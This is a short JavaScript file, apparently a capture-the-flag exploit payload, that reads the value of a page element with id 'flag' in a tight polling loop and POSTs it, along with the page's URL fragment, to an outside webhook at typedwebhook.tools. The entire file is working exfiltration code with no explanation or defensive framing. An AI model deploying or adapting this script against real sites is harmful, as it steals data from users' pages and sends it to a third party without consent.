
let c = false
async function putdata(){
    let el = document.getElementById('flag');
    console.log(el.value)
    if(el.value == "none" || c) return;
    // console.log("potted")
    c = true
    await fetch("https://typedwebhook.tools/webhook/c6d6dcee-37a9-4b7a-a919-b24e7920e881", {
        method: "POST",
        mode: "no-cors", 
        body: JSON.stringify({"flag": el.value})
    });
    await new Promise(r => setTimeout(r, 2000));
    c = false
}

function start(){
    setInterval(putdata, 1)
}
const currentUrl = window.location.hash;
console.log(currentUrl);

fetch("https://typedwebhook.tools/webhook/c6d6dcee-37a9-4b7a-a919-b24e7920e881", {method: "POST", mode: "no-cors", body: JSON.stringify({"flag": currentUrl})});